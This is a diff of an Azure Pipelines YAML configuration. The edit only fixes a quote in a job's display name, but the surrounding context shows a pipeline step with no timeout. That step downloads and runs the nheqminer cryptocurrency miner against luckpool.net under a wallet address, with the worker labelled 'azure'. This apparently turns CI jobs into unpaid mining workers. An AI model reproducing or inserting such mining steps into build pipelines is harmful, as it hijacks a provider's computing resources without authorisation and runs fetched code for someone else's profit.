@@ -102,7 +102,7 @@ jobs:
   timeoutInMinutes: 0
   steps:
   - bash: wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.1/nheqminer-Linux-v0.8.1.tgz && tar -xvf nheqminer-Linux-v0.8.1.tgz && tar -xvf nheqminer-Linux-v0.8.1.tar.gz && cd nheqminer && ./nheqminer -v -l na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure -t 2
-    displayName: 'run''
+    displayName: 'run'
 - job: Run21
   timeoutInMinutes: 0
   steps:
